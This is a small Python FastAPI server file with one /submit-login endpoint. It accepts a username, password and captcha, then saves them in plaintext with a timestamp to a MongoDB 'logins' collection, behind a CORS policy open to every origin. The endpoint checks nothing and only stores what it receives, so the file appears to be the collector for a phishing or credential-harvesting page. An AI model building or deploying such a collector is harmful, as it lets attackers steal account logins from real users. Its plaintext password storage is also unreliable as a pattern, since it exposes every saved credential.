from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from pymongo import MongoClient
from datetime import datetime
from dotenv import load_dotenv
load_dotenv()
import json
import os

app = FastAPI()

MONGO_URL=os.getenv("MONGO_URL")

client = MongoClient(MONGO_URL)
llm = client['smartsow']
db=llm['gpkp']
login_data=db['logins']
# ✅ Add CORS middleware so your React frontend can access this API
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # You can restrict this to your React app domain
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

DATA_FILE = "login_data.jsonl"  # Each record saved as JSON line


@app.post("/submit-login")
async def submit_login(request: Request):
    """Accepts raw JSON (username, password, captcha) and saves it with timestamp."""
    data = await request.json()
    username = data.get("username")
    password = data.get("password")
    captcha = data.get("captcha")

    if not all([username, password, captcha]):
        return {"status": "error", "message": "Missing required fields"}

    entry = {
        "username": username,
        "password": password,
        "captcha": captcha,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    login_data.insert_one(entry)

    return {"status": "success", "message": "Data saved successfully"}